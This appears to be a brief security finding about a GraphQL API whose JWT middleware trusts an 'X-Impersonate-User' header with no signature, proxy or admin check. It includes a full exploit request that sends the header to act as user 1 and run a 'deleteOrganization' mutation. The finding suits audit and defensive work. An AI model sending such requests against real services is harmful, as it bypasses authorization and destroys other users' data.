diagnosis: CustomJWTGatewayMiddleware checks HTTP_X_IMPERSONATE_USER and replaces info.context.user with the target user object prior to executing GraphQL resolvers, without verifying an internal HMAC signature, trusted proxy IP, or administrator privileges. Any client can pass 'X-Impersonate-User: 1' to execute GraphQL operations with the authorization context of any user.
exploit_request:
POST /graphql/ HTTP/1.1
Host: api.saasgraph.com
Authorization: JWT <normal_user_token>
X-Impersonate-User: 1
Content-Type: application/json

{"query": "mutation { deleteOrganization(id: \"ORG-01\") { success } }"}
